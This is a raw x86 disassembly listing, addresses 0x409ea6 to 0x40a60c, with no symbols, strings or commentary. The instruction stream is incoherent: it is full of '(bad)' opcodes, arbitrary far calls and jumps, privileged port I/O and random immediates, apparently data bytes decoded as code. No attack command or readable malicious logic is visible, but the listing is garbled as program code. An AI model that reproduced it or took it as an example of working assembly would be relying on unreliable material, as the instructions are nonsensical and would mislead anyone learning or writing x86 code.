  409ea6:	lds    eax,FWORD PTR [edi+eiz*8+0x0]
  409eaa:	neg    BYTE PTR [edi+edi*8]
  409ead:	dec    esi
  409eae:	std    
  409eaf:	push   edx
  409eb0:	inc    edx
  409eb1:	bound  esp,QWORD PTR [eax+0x162779e6]
  409eb7:	push   esp
  409eb8:	add    ecx,DWORD PTR [edi+eax*1+0x7d]
  409ebc:	mov    al,ds:0xb64f051a
  409ec1:	jae    0x409ef1
  409ec3:	int3   
  409ec4:	sub    ah,BYTE PTR [esi-0x1a]
  409ec7:	cmp    al,0x9e
  409ec9:	add    al,0x77
  409ecb:	repnz xor al,0xae
  409ece:	mov    BYTE PTR [edx-0x24e539a8],al
  409ed4:	stos   DWORD PTR es:[edi],eax
  409ed5:	fld    QWORD PTR [eax+0x116abdee]
  409edb:	mov    eax,cs:0xec36344e
  409ee1:	jae    0x409ec6
  409ee3:	call   0x133e:0x87f53679
  409eea:	cli    
  409eeb:	stc    
  409eec:	fidivr DWORD PTR [edi-0x25]
  409eef:	in     al,0x27
  409ef1:	adc    DWORD PTR [edi+edx*8],esi
  409ef4:	and    BYTE PTR [eax+0x511de59],cl
  409efa:	cs retf 
  409efc:	jb     0x409ee8
  409efe:	adc    eax,0xd7dd901d
  409f03:	les    ebx,FWORD PTR [eax]
  409f05:	mov    bl,0xd0
  409f07:	fld    TBYTE PTR [ebx-0x1f5f69df]
  409f0d:	sbb    DWORD PTR [ebx-0x2e6d7cf8],esi
  409f13:	mov    ah,cl
  409f15:	(bad)  
  409f16:	data16 (bad) 
  409f18:	sbb    dh,ch
  409f1a:	call   0x76a35d64
  409f1f:	or     BYTE PTR [edx+0x24],bl
  409f22:	test   eax,0x9b080d6d
  409f27:	dec    ebx
  409f28:	loope  0x409f76
  409f2a:	mov    edi,0x13b694ed
  409f2f:	aad    0xb
  409f31:	out    0x36,al
  409f33:	rcr    BYTE PTR [edi+edx*4-0x57],0xb4
  409f38:	mul    BYTE PTR [ecx-0x26330b22]
  409f3e:	inc    eax
  409f3f:	pushf  
  409f40:	push   ebp
  409f41:	mov    edi,0xab160f27
  409f46:	loopne 0x409f96
  409f48:	pusha  
  409f49:	xchg   ebx,eax
  409f4a:	in     eax,dx
  409f4b:	shl    DWORD PTR [ebx+0x69],1
  409f4e:	pop    ss
  409f4f:	call   0xf9601f5f
  409f54:	sbb    ch,ah
  409f56:	stos   DWORD PTR es:[edi],eax
  409f57:	sbb    edx,ebx
  409f59:	shl    DWORD PTR [ebp-0x13b7706b],0x17
  409f60:	push   0x4b
  409f62:	pop    ss
  409f63:	(bad)  
  409f65:	imul   ecx,DWORD PTR [esi-0x13],0x35
  409f69:	fistp  DWORD PTR [edi-0x10258249]
  409f6f:	lds    eax,FWORD PTR [ebp+esi*4-0x68cc0bfd]
  409f76:	in     eax,0x30
  409f78:	inc    ebx
  409f79:	outs   dx,BYTE PTR ds:[esi]
  409f7a:	or     al,0x5c
  409f7c:	test   BYTE PTR [esi-0x68761e4e],cl
  409f82:	push   edx
  409f83:	ins    BYTE PTR es:[edi],dx
  409f84:	mov    edx,0x92452d1
  409f89:	arpl   dx,bp
  409f8b:	inc    edi
  409f8c:	cmc    
  409f8d:	sbb    BYTE PTR [edi],al
  409f8f:	sub    ch,BYTE PTR [ebx+0x54]
  409f92:	sub    al,0x3
  409f94:	push   ebp
  409f95:	scas   eax,DWORD PTR es:[edi]
  409f96:	inc    edi
  409f97:	cmp    al,0x6e
  409f99:	dec    ebp
  409f9a:	pop    ebp
  409f9b:	(bad)  
  409f9c:	xchg   DWORD PTR [edi+0xda1da3],edx
  409fa2:	shl    ecx,cl
  409fa4:	lahf   
  409fa5:	adc    cl,bl
  409fa7:	mov    eax,0x1ad4ae8
  409fac:	add    edx,DWORD PTR [ebx-0x72]
  409faf:	xchg   ebx,ebx
  409fb1:	pop    esi
  409fb2:	icebp  
  409fb3:	push   ss
  409fb4:	dec    ebp
  409fb5:	add    DWORD PTR [ebp+0x52a44b31],esi
  409fbb:	ja     0x409faf
  409fbd:	xor    bl,BYTE PTR [ebp+ecx*1-0x74]
  409fc1:	std    
  409fc2:	push   edx
  409fc3:	fisubr WORD PTR [esi]
  409fc5:	jb     0x409fd5
  409fc7:	inc    eax
  409fc8:	mov    dh,0x9a
  409fca:	xchg   ebx,eax
  409fcb:	je     0x40a01d
  409fcd:	add    ch,bh
  409fcf:	test   ebp,edx
  409fd1:	ds mov esp,esi
  409fd4:	inc    esp
  409fd5:	repz pusha 
  409fd7:	dec    esp
  409fd8:	call   0x5e2c:0xfb0e518d
  409fdf:	or     BYTE PTR [eax],al
  409fe1:	cwde   
  409fe2:	pushf  
  409fe3:	dec    ecx
  409fe4:	(bad)  
  409fe5:	in     eax,dx
  409fe6:	leave  
  409fe7:	sahf   
  409fe8:	inc    eax
  409fe9:	mov    ah,0xed
  409feb:	dec    edx
  409fec:	jbe    0x409fb5
  409fee:	in     eax,dx
  409fef:	fwait
  409ff0:	cld    
  409ff1:	inc    edx
  409ff2:	(bad)  
  409ff4:	jb     0x409fc9
  409ff6:	mov    esi,ebx
  409ff8:	pop    ecx
  409ff9:	outs   dx,DWORD PTR ds:[esi]
  409ffa:	(bad)  
  409ffb:	loopne 0x409ffe
  409ffd:	push   ecx
  409ffe:	sbb    al,0x29
  40a000:	shl    BYTE PTR [edi+0x5a],cl
  40a003:	div    DWORD PTR [esi-0x20099096]
  40a009:	lea    ebx,[edi+edx*2]
  40a00c:	xchg   ebx,eax
  40a00d:	lds    ebp,FWORD PTR [esi-0x627108bc]
  40a013:	jle    0x40a024
  40a015:	jae    0x40a00b
  40a017:	icebp  
  40a018:	(bad)  
  40a019:	or     al,0xd3
  40a01b:	sbb    DWORD PTR [esi-0x2c91c77c],ebp
  40a021:	push   ebp
  40a022:	xchg   esp,eax
  40a023:	mov    eax,DWORD PTR [eax+0x77a238a]
  40a029:	jo     0x40a019
  40a02b:	fs jbe 0x40a040
  40a02e:	loop   0x409fbc
  40a030:	rcl    ebx,cl
  40a032:	outs   dx,DWORD PTR ds:[esi]
  40a033:	push   ebx
  40a034:	mov    esi,DWORD PTR [ebp-0x366f098c]
  40a03a:	pushf  
  40a03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a03c:	fdivr  QWORD PTR [edx-0x1582d8b]
  40a042:	repz jmp 0x40a0b1
  40a045:	inc    edi
  40a046:	push   ebx
  40a047:	mov    cl,0xb0
  40a049:	and    dl,BYTE PTR [edx]
  40a04b:	les    ebx,FWORD PTR [esi+ecx*1-0x6e]
  40a04f:	jmp    edx
  40a051:	mov    WORD PTR [ecx-0x11],es
  40a054:	aaa    
  40a055:	push   esp
  40a056:	adc    eax,0x4f87109a
  40a05b:	sbb    DWORD PTR [eax],ebp
  40a05d:	push   ds
  40a05e:	jb     0x40a00e
  40a060:	lahf   
  40a061:	mov    ah,0x40
  40a063:	jge    0x40a091
  40a065:	ss or  al,0xed
  40a068:	pop    ebx
  40a069:	aaa    
  40a06a:	jmp    0xc056:0x5edf440a
  40a071:	dec    ebx
  40a072:	stos   BYTE PTR es:[edi],al
  40a073:	dec    ebx
  40a074:	pop    es
  40a075:	add    al,0xb4
  40a077:	int    0xd4
  40a079:	imul   esp,DWORD PTR [edi+0x13973abf],0xffffffd2
  40a080:	sar    eax,1
  40a082:	push   cs
  40a083:	mov    ebx,0xb9b5cee5
  40a088:	xor    al,0x28
  40a08a:	cli    
  40a08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a08c:	and    DWORD PTR [ecx-0x5cfb9127],ecx
  40a092:	jae    0x40a0c6
  40a094:	dec    edi
  40a095:	adc    DWORD PTR [esi-0x2e],eax
  40a098:	mov    bl,0x1a
  40a09a:	sbb    BYTE PTR [edx],0x71
  40a09d:	cli    
  40a09e:	pop    ecx
  40a09f:	ss inc eax
  40a0a1:	in     eax,dx
  40a0a2:	rcl    BYTE PTR ds:0xfb5f76bc,1
  40a0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0a9:	mov    ds:0x4c7f30aa,eax
  40a0ae:	cmc    
  40a0af:	ror    al,1
  40a0b1:	mov    ch,0xa6
  40a0b3:	push   ebp
  40a0b4:	add    DWORD PTR [edx+eiz*4+0x44],esi
  40a0b8:	std    
  40a0b9:	int    0xe8
  40a0bb:	in     eax,dx
  40a0bc:	leave  
  40a0bd:	lahf   
  40a0be:	pop    DWORD PTR [edi]
  40a0c0:	loopne 0x40a057
  40a0c2:	dec    ebx
  40a0c3:	xchg   esp,eax
  40a0c4:	adc    edi,edi
  40a0c6:	clc    
  40a0c7:	dec    esi
  40a0c8:	ss loope 0x40a04c
  40a0cb:	sbb    ebx,DWORD PTR [edx+0x3ce6611e]
  40a0d1:	adc    BYTE PTR ds:0x8e1f6801,bl
  40a0d7:	and    eax,DWORD PTR [edi+0x6f]
  40a0da:	add    al,0x2c
  40a0dc:	xchg   BYTE PTR [ebx],dh
  40a0de:	inc    esp
  40a0df:	pop    edi
  40a0e0:	out    0x62,eax
  40a0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e3:	inc    ebp
  40a0e4:	shl    eax,cl
  40a0e6:	fmulp  st(7),st
  40a0e8:	dec    ebx
  40a0e9:	push   ebp
  40a0ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0eb:	dec    esi
  40a0ec:	out    dx,eax
  40a0ed:	mov    esp,0x567aa0d5
  40a0f2:	pop    ebx
  40a0f3:	mov    dl,0x36
  40a0f5:	mov    al,0x89
  40a0f7:	dec    esi
  40a0f8:	or     eax,0xe3577005
  40a0fd:	mov    cl,0x3d
  40a0ff:	jge    0x40a11b
  40a101:	shl    DWORD PTR [esi],cl
  40a103:	imul   edi,DWORD PTR [ebx],0xffffffe4
  40a106:	inc    esp
  40a107:	je     0x40a0fe
  40a109:	mov    ds:0xd5ebe69b,al
  40a10e:	jle    0x40a185
  40a110:	and    DWORD PTR [edx-0x69],edi
  40a113:	mov    al,ds:0x90cf948f
  40a118:	sbb    eax,0x49466a6c
  40a11d:	or     eax,0xe7c3ed1f
  40a122:	dec    ebx
  40a123:	mov    dh,0xd7
  40a125:	pop    edx
  40a126:	(bad)  
  40a127:	mov    ah,0x12
  40a129:	inc    ebp
  40a12a:	sbb    DWORD PTR [ecx-0x6e],edi
  40a12d:	lds    ebp,FWORD PTR [ecx-0x23f77997]
  40a133:	cmp    BYTE PTR [edi-0x49],cl
  40a136:	fs inc edx
  40a138:	aad    0x4e
  40a13a:	pop    edi
  40a13b:	xchg   edi,eax
  40a13c:	xor    eax,ecx
  40a13e:	push   es
  40a13f:	fdiv   st(1),st
  40a141:	mov    ds:0x45519fe4,eax
  40a146:	test   eax,0xfac292d2
  40a14b:	adc    ebp,DWORD PTR [eax]
  40a14d:	adc    edi,ebp
  40a14f:	pop    edx
  40a150:	xlat   BYTE PTR ds:[ebx]
  40a151:	jmp    0xde97ee26
  40a156:	cmp    bl,BYTE PTR [eax+0x51]
  40a159:	lock ja 0x40a0ec
  40a15c:	pop    ecx
  40a15d:	dec    DWORD PTR [edi-0x6bd30a5]
  40a163:	pop    DWORD PTR [edx+0x175738da]
  40a169:	sbb    bh,ah
  40a16b:	frstor [edx]
  40a16d:	pop    esp
  40a16e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a170:	cld    
  40a171:	dec    ebx
  40a172:	sub    cl,BYTE PTR [ecx]
  40a174:	and    al,0x23
  40a176:	out    dx,eax
  40a177:	mov    bl,0x23
  40a179:	jbe    0x40a192
  40a17b:	imul   ebx,DWORD PTR [edi],0xfe491a80
  40a181:	sub    eax,0x6d5ad971
  40a186:	mov    bh,0xc7
  40a188:	xor    eax,0x42766a86
  40a18d:	mov    dh,0x16
  40a18f:	dec    esi
  40a190:	adc    bh,BYTE PTR [edx+0x5c]
  40a193:	xchg   ebp,eax
  40a194:	(bad)
  40a197:	mov    eax,0xbe838c4b
  40a19c:	(bad)  
  40a19d:	retf   0x4f44
  40a1a0:	call   0x7d6f:0xf222e108
  40a1a7:	mov    ah,0xc3
  40a1a9:	neg    BYTE PTR [edi]
  40a1ab:	dec    eax
  40a1ac:	mov    bh,0xc9
  40a1ae:	inc    esi
  40a1af:	xchg   ebx,eax
  40a1b0:	in     eax,0xa0
  40a1b2:	outs   dx,BYTE PTR ds:[esi]
  40a1b3:	xlat   BYTE PTR ds:[ebx]
  40a1b4:	scas   eax,DWORD PTR es:[edi]
  40a1b5:	xchg   esi,eax
  40a1b6:	or     dl,ch
  40a1b8:	loop   0x40a1fe
  40a1ba:	cdq    
  40a1bb:	jl     0x40a190
  40a1bd:	push   edi
  40a1be:	rcr    DWORD PTR [ecx-0x31dca63a],cl
  40a1c4:	jne    0x40a193
  40a1c6:	loope  0x40a219
  40a1c8:	jns    0x40a1a1
  40a1ca:	jno    0x40a15b
  40a1cc:	fimul  WORD PTR ds:0x28d86953
  40a1d2:	(bad)  
  40a1d3:	imul   DWORD PTR fs:[ebp-0x1c335d0f]
  40a1da:	push   ds
  40a1db:	pushf  
  40a1dc:	cmp    dh,BYTE PTR [ecx-0x11]
  40a1df:	xor    bl,BYTE PTR [edx]
  40a1e1:	sar    DWORD PTR [ecx-0x5998c03a],0x70
  40a1e8:	cmp    al,0xdf
  40a1ea:	sub    esi,esi
  40a1ec:	pop    esi
  40a1ed:	scas   eax,DWORD PTR es:[edi]
  40a1ee:	scas   al,BYTE PTR es:[edi]
  40a1ef:	call   0x75342d04
  40a1f4:	test   BYTE PTR [ebp-0x6cd5120f],bh
  40a1fa:	cmp    BYTE PTR [esi+ebx*4],cl
  40a1fd:	retf   0x9b17
  40a200:	xchg   ebx,eax
  40a201:	xchg   BYTE PTR [ebp-0x64],ah
  40a204:	mov    cl,0x7c
  40a206:	pop    edi
  40a207:	into   
  40a208:	fsub   DWORD PTR [eax+0x5bfdfd12]
  40a20e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20f:	bnd ret 0x8019
  40a213:	push   es
  40a214:	rol    DWORD PTR [ebx-0x26c9042b],0xbf
  40a21b:	jae    0x40a24b
  40a21d:	sbb    eax,0x7ccfb468
  40a222:	scas   eax,DWORD PTR es:[edi]
  40a223:	sub    BYTE PTR fs:[ebx+0x62],bl
  40a227:	dec    ebx
  40a228:	xor    esi,DWORD PTR [eax+0x65]
  40a22b:	shr    DWORD PTR [esi-0x13],0x6c
  40a22f:	add    al,0x4
  40a231:	jg     0x40a260
  40a233:	mov    BYTE PTR [ebx],ch
  40a235:	loope  0x40a26e
  40a237:	xor    bh,dl
  40a239:	aaa    
  40a23a:	data16 cmc 
  40a23c:	mov    edi,0x8df05d61
  40a241:	dec    edx
  40a242:	or     al,0x12
  40a244:	jl     0x40a24b
  40a246:	cmp    al,0xd1
  40a248:	cwde   
  40a249:	push   DWORD PTR [edx+0x27]
  40a24c:	cmp    cl,dl
  40a24e:	test   eax,0x6796c69c
  40a253:	daa    
  40a254:	or     edx,ebp
  40a256:	pushf  
  40a257:	lods   al,BYTE PTR ds:[esi]
  40a258:	shr    dl,cl
  40a25a:	arpl   WORD PTR [ebx],bp
  40a25c:	je     0x40a238
  40a25e:	inc    edx
  40a25f:	cli    
  40a260:	push   esp
  40a261:	inc    edi
  40a262:	popa   
  40a263:	sbb    DWORD PTR [eax],ebx
  40a265:	pop    esp
  40a266:	lock jb 0x40a2a3
  40a269:	pop    ebx
  40a26a:	aaa    
  40a26b:	add    bh,BYTE PTR [edx]
  40a26d:	add    DWORD PTR [ebp-0x4b],eax
  40a270:	inc    esi
  40a271:	push   esp
  40a272:	sbb    al,0xe5
  40a274:	cmp    BYTE PTR [ecx],0x7c
  40a277:	mov    dh,0x86
  40a279:	sub    al,0xe7
  40a27b:	fwait
  40a27c:	lds    esi,FWORD PTR [ebp-0xd]
  40a27f:	out    dx,al
  40a280:	jne    0x40a21b
  40a282:	adc    BYTE PTR [edx+edx*1],dl
  40a285:	lock pop edx
  40a287:	out    0xfe,eax
  40a289:	mov    al,0x86
  40a28b:	dec    eax
  40a28c:	out    dx,al
  40a28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a28e:	(bad)  
  40a28f:	out    0x3c,eax
  40a291:	loope  0x40a240
  40a293:	std    
  40a294:	pop    ecx
  40a295:	add    DWORD PTR [ebp-0x74],ecx
  40a298:	mov    ecx,DWORD PTR [ecx]
  40a29a:	dec    edi
  40a29b:	adc    al,0x21
  40a29d:	inc    ebp
  40a29e:	loop   0x40a256
  40a2a0:	loop   0x40a2ce
  40a2a2:	data16 sub dh,cl
  40a2a5:	ret    
  40a2a6:	icebp  
  40a2a7:	sar    dh,1
  40a2a9:	rcr    DWORD PTR ds:0x9d973e32,cl
  40a2af:	mov    bh,BYTE PTR [edi-0x51]
  40a2b2:	dec    ecx
  40a2b3:	es mov edi,0xf24e576a
  40a2b9:	xor    DWORD PTR [edx-0x8],esp
  40a2bc:	xchg   ebp,eax
  40a2bd:	test   al,0xfa
  40a2bf:	inc    ebp
  40a2c0:	lock xor BYTE PTR [esi+0x62],cl
  40a2c4:	mov    BYTE PTR [ebx+0x49],al
  40a2c7:	jp     0x40a269
  40a2c9:	inc    edi
  40a2ca:	mov    bh,0xd0
  40a2cc:	hlt    
  40a2cd:	jo     0x40a323
  40a2cf:	iret   
  40a2d0:	dec    ecx
  40a2d1:	(bad)  
  40a2d2:	in     eax,dx
  40a2d3:	aad    0xc
  40a2d5:	pusha  
  40a2d6:	pop    ebp
  40a2d7:	dec    ebp
  40a2d8:	icebp  
  40a2d9:	ror    DWORD PTR [edi],1
  40a2db:	inc    ebx
  40a2dc:	or     BYTE PTR [ebx-0x6a],dl
  40a2df:	(bad)  
  40a2e0:	ficom  WORD PTR [ecx-0x32c43d1a]
  40a2e6:	adc    eax,0xf8805993
  40a2eb:	jbe    0x40a35a
  40a2ed:	ret    
  40a2ee:	push   ebx
  40a2ef:	(bad)  
  40a2f1:	add    al,0x9d
  40a2f3:	push   0xfffffff8
  40a2f5:	shr    DWORD PTR [esi-0x71f4cce8],1
  40a2fb:	sub    BYTE PTR [ebx-0x20],dh
  40a2fe:	clc    
  40a2ff:	cli    
  40a300:	sbb    BYTE PTR cs:[edi+ebp*8],ch
  40a304:	fwait
  40a305:	xchg   ebx,eax
  40a306:	leave  
  40a307:	popa   
  40a308:	jne    0x40a363
  40a30a:	fisub  DWORD PTR [eax+eiz*8+0x40b52d6c]
  40a311:	idiv   edx
  40a313:	sbb    al,0xc4
  40a315:	inc    esp
  40a316:	or     DWORD PTR ds:[eax+0x55],ebx
  40a31a:	xlat   BYTE PTR ds:[ebx]
  40a31b:	mov    WORD PTR [ebx-0x13],es
  40a31e:	xchg   edx,eax
  40a31f:	stc    
  40a320:	jg     0x40a2c1
  40a322:	xchg   DWORD PTR [ecx-0x1f3c63f],eax
  40a328:	pushf  
  40a329:	add    al,0xe0
  40a32b:	xchg   esi,eax
  40a32c:	mov    BYTE PTR [ecx+0x3f57f9d9],bh
  40a332:	push   es
  40a333:	jne    0x40a2fd
  40a335:	push   0xfffffff8
  40a337:	pop    eax
  40a338:	xor    dl,dh
  40a33a:	lods   eax,DWORD PTR ds:[esi]
  40a33b:	leave  
  40a33c:	add    BYTE PTR [esi-0x71],dh
  40a33f:	jae    0x40a2e8
  40a341:	pop    esp
  40a342:	fdiv   st,st(3)
  40a344:	mov    edx,0xab97aae1
  40a349:	sub    al,0xc8
  40a34b:	rcr    di,cl
  40a34e:	sahf   
  40a34f:	stos   BYTE PTR es:[edi],al
  40a350:	or     bh,BYTE PTR [eax]
  40a352:	adc    BYTE PTR [esi+0xe3cef8c],al
  40a358:	jnp    0x40a38c
  40a35a:	dec    ebp
  40a35b:	adc    dh,BYTE PTR [edx]
  40a35d:	pusha  
  40a35e:	js     0x40a3a5
  40a360:	out    0xe8,al
  40a362:	jae    0x40a303
  40a364:	sbb    al,0xc
  40a366:	push   esi
  40a367:	ja     0x40a37f
  40a369:	push   es
  40a36a:	pop    edi
  40a36b:	adc    cl,ch
  40a36d:	sar    DWORD PTR [edx-0x5817981f],1
  40a373:	loop   0x40a371
  40a375:	bound  eax,QWORD PTR [edx]
  40a377:	mov    edx,0xd8b886a4
  40a37c:	lds    ebx,FWORD PTR [ebx+0x25]
  40a37f:	inc    esp
  40a380:	pop    ds
  40a381:	xor    DWORD PTR [edi-0x20],edi
  40a384:	retf   
  40a385:	push   es
  40a386:	sbb    al,0x39
  40a388:	lahf   
  40a389:	test   BYTE PTR [ebx-0x184f8e9a],ch
  40a38f:	test   BYTE PTR [ebx+ebp*2-0x36],ch
  40a393:	add    al,0xc3
  40a395:	hlt    
  40a396:	ret    0xec0d
  40a399:	sbb    al,0x88
  40a39b:	mov    ecx,0x7b103f11
  40a3a0:	dec    esp
  40a3a1:	jnp    0x40a37c
  40a3a3:	cmp    al,0x72
  40a3a5:	inc    edi
  40a3a6:	mov    dh,0x6e
  40a3a8:	test   ecx,0xaf11c8ee
  40a3ae:	(bad)  
  40a3af:	mov    esp,0xaefc2377
  40a3b4:	or     BYTE PTR [eax-0x71010541],dh
  40a3ba:	push   cs
  40a3bb:	ret    
  40a3bc:	push   0xffffffdf
  40a3be:	mov    ds:0x351d4024,al
  40a3c3:	adc    BYTE PTR [ebx+eax*2+0x33554e2f],0xcb
  40a3cb:	lea    eax,[eax]
  40a3cd:	cmc    
  40a3ce:	pop    ebp
  40a3cf:	fucomi st,st(7)
  40a3d1:	test   BYTE PTR ds:0x6ee02471,al
  40a3d7:	and    al,0xfa
  40a3d9:	inc    ebp
  40a3da:	add    dh,BYTE PTR [edx]
  40a3dc:	sub    ebx,DWORD PTR [edx-0x31]
  40a3df:	daa    
  40a3e0:	rcr    ebx,cl
  40a3e2:	ret    
  40a3e3:	nop
  40a3e4:	sbb    al,0x29
  40a3e6:	mov    ebp,0xbee4daea
  40a3eb:	fisubr DWORD PTR [ebx+0x66]
  40a3ee:	mov    edi,0x6be6cab1
  40a3f3:	pop    edi
  40a3f4:	inc    edx
  40a3f5:	or     DWORD PTR [edx+0x73],esi
  40a3f8:	add    eax,DWORD PTR [edx+ebp*1+0x7f]
  40a3fc:	or     ecx,DWORD PTR [edi+edi*2+0x65]
  40a400:	ds adc al,0xbf
  40a403:	pop    esp
  40a404:	jmp    0x40a418
  40a406:	push   ds
  40a407:	and    ah,bl
  40a409:	xchg   ebx,eax
  40a40a:	xchg   esp,eax
  40a40b:	mov    esp,0x33a68311
  40a410:	aaa    
  40a411:	mov    esp,0x2ceb2590
  40a416:	sbb    DWORD PTR [esi+0x1806134b],0x26
  40a41d:	adc    ah,BYTE PTR [ebx+0x319e5409]
  40a423:	adc    al,0xc5
  40a425:	pop    ebp
  40a426:	sbb    eax,0x7d1644fb
  40a42b:	imul   DWORD PTR [edi+esi*8+0x41]
  40a42f:	hlt    
  40a430:	div    DWORD PTR [edx]
  40a432:	xchg   BYTE PTR [eax],dh
  40a434:	loopne 0x40a429
  40a436:	js     0x40a469
  40a438:	hlt    
  40a439:	adc    BYTE PTR [edi+0x5b10045d],ch
  40a43f:	or     DWORD PTR [esi],ebp
  40a441:	sbb    al,0x8a
  40a443:	into   
  40a444:	xor    BYTE PTR ds:0x75dcaa29,ch
  40a44a:	dec    eax
  40a44b:	xchg   edi,eax
  40a44c:	div    BYTE PTR [ebx+eax*8-0x2981e45]
  40a453:	int    0x3c
  40a455:	call   0x9506:0xaf622f89
  40a45c:	fadd   QWORD PTR [esi-0x3a]
  40a45f:	jnp    0x40a4ca
  40a461:	mov    ds:0xcfd438fb,al
  40a466:	mov    ecx,0x5e37e903
  40a46b:	mov    ecx,0x49da0f11
  40a470:	(bad)
  40a474:	stos   BYTE PTR es:[edi],al
  40a475:	add    al,0xa9
  40a477:	shl    bl,1
  40a479:	sti    
  40a47a:	clc    
  40a47b:	hlt    
  40a47c:	retf   
  40a47d:	add    ecx,DWORD PTR [ecx+0x1487503]
  40a483:	or     ecx,DWORD PTR [ebx+0xe33a4b8]
  40a489:	cmp    eax,0x8a5aca82
  40a48e:	(bad)  
  40a48f:	xor    eax,0x2650d91e
  40a494:	imul   edi,DWORD PTR ds:0x39d57c99,0x67
  40a49b:	enter  0x5f8c,0x4d
  40a49f:	inc    esi
  40a4a0:	mov    ebp,0x6790ae84
  40a4a6:	neg    ch
  40a4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4a9:	add    DWORD PTR [esi+0x67],esp
  40a4ac:	dec    ebp
  40a4ad:	xchg   DWORD PTR [esi+0x57],edx
  40a4b0:	mov    WORD PTR [edx],ds
  40a4b2:	stos   DWORD PTR es:[edi],eax
  40a4b3:	(bad)  
  40a4b4:	ret    0x8950
  40a4b7:	adc    BYTE PTR [eax],cl
  40a4b9:	mov    ds:0x3f2e106,al
  40a4be:	sbb    eax,0xe138f68c
  40a4c3:	cmp    dl,BYTE PTR [eax+0x3557c6ff]
  40a4c9:	repnz enter 0x871f,0x31
  40a4ce:	cld    
  40a4cf:	into   
  40a4d0:	mov    ebx,fs
  40a4d2:	push   0x223bdd79
  40a4d7:	(bad)  
  40a4d8:	shl    DWORD PTR ds:0xd49e17d3,0xa4
  40a4df:	jnp    0x40a532
  40a4e1:	xchg   esp,eax
  40a4e2:	xor    dl,BYTE PTR [edi+esi*4+0x6a]
  40a4e6:	pop    esi
  40a4e7:	int3   
  40a4e8:	mov    esp,0xff9687b0
  40a4ed:	stos   BYTE PTR es:[edi],al
  40a4ee:	mov    esi,0x1de09bf2
  40a4f3:	loopne 0x40a502
  40a4f5:	popf   
  40a4f6:	or     BYTE PTR [ecx+0x1],0xa
  40a4fa:	shl    BYTE PTR [ebp-0x49d8e5bf],0x18
  40a501:	shl    DWORD PTR [eax+0x4c],1
  40a504:	popf   
  40a505:	imul   edx,DWORD PTR [edx+0x18],0x77350994
  40a50c:	lds    edi,FWORD PTR [edx+0x7b]
  40a50f:	and    BYTE PTR [ebx],bh
  40a511:	je     0x40a579
  40a513:	xchg   bh,ah
  40a515:	sub    edi,DWORD PTR [eax]
  40a517:	cdq    
  40a518:	jns    0x40a546
  40a51a:	repnz mov esp,0x29b1652c
  40a520:	xchg   ecx,eax
  40a521:	adc    BYTE PTR [eax-0x6094ee39],cl
  40a527:	lods   eax,DWORD PTR es:[esi]
  40a529:	push   es
  40a52a:	push   es
  40a52b:	fimul  WORD PTR [edi+eax*4-0x1d]
  40a52f:	or     dl,BYTE PTR [esi+0x30bbe774]
  40a535:	add    ebp,edi
  40a537:	ja     0x40a59b
  40a539:	add    eax,0xc742b215
  40a53e:	and    cl,BYTE PTR [ecx+0x18263ea8]
  40a544:	xlat   BYTE PTR ds:[ebx]
  40a545:	mov    ebp,0xfc352dda
  40a54a:	cmp    al,0x45
  40a54c:	and    cl,0x3f
  40a54f:	les    ebp,FWORD PTR [ebx-0x7275a371]
  40a555:	sbb    bh,bh
  40a557:	adc    edi,DWORD PTR [edx+edx*1]
  40a55a:	jmp    esp
  40a55c:	mov    eax,0xe67a90e0
  40a561:	pop    ecx
  40a562:	ds push 0x98f7aab8
  40a568:	std    
  40a569:	sub    bh,BYTE PTR [edi+0x3d]
  40a56c:	pop    ecx
  40a56d:	out    dx,al
  40a56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a56f:	in     al,0xa7
  40a571:	ret    0x11bb
  40a574:	lahf   
  40a575:	mov    edi,0x27688754
  40a57a:	push   ss
  40a57b:	(bad)  
  40a57c:	xchg   ecx,eax
  40a57d:	sub    eax,0x24a7a834
  40a582:	mov    ah,0x64
  40a584:	adc    eax,0x38ba771d
  40a589:	es lock das 
  40a58c:	stos   BYTE PTR es:[edi],al
  40a58d:	xchg   esi,eax
  40a58e:	addr16 popa 
  40a590:	out    dx,al
  40a591:	ins    BYTE PTR es:[edi],dx
  40a592:	ret    0x1258
  40a595:	sbb    BYTE PTR [ebp-0x14],ah
  40a598:	ins    DWORD PTR es:[edi],dx
  40a599:	fsubr  DWORD PTR [ebx-0x5556116a]
  40a59f:	addr16 jnp 0x40a5b3
  40a5a2:	arpl   WORD PTR [ebp+0x6accdf3e],di
  40a5a8:	inc    DWORD PTR [ebp+0x50a845d4]
  40a5ae:	push   ebx
  40a5af:	daa    
  40a5b0:	xchg   DWORD PTR [esi+0xb],ebx
  40a5b3:	loopne 0x40a634
  40a5b5:	enter  0x3817,0xfa
  40a5b9:	pop    ebx
  40a5ba:	jge    0x40a56a
  40a5bc:	(bad)  
  40a5bd:	add    DWORD PTR [ecx],edi
  40a5bf:	bound  ebp,QWORD PTR [esi+ecx*2-0x548a258a]
  40a5c6:	dec    ecx
  40a5c7:	psrlw  mm7,mm1
  40a5ca:	(bad)  [eax+0x3e]
  40a5cd:	idiv   DWORD PTR [eax-0x2acf9416]
  40a5d3:	inc    esi
  40a5d4:	jo     0x40a5c5
  40a5d6:	mov    cl,bl
  40a5d8:	xor    al,0xf5
  40a5db:	or     BYTE PTR [ebp-0x44],bh
  40a5de:	fmul   st,st(7)
  40a5e0:	sbb    ecx,eax
  40a5e2:	inc    eax
  40a5e3:	mov    DWORD PTR [ecx-0x3aa5f8ad],esp
  40a5e9:	loopne 0x40a5a4
  40a5eb:	mov    dl,0x42
  40a5ed:	push   cs
  40a5ee:	mov    BYTE PTR [edx],bl
  40a5f0:	hlt    
  40a5f1:	mov    ds:0x384b5488,eax
  40a5f6:	std    
  40a5f7:	mov    edi,0xacb1a51e
  40a5fc:	sbb    eax,0x2eb0e41d
  40a601:	aas    
  40a602:	mov    ebx,0xd8d7db7f
  40a607:	daa    
  40a608:	dec    eax
  40a609:	pop    ebp
  40a60a:	adc    al,0x39
  40a60c:	sub    al,BYTE PTR [esp+esi*8]
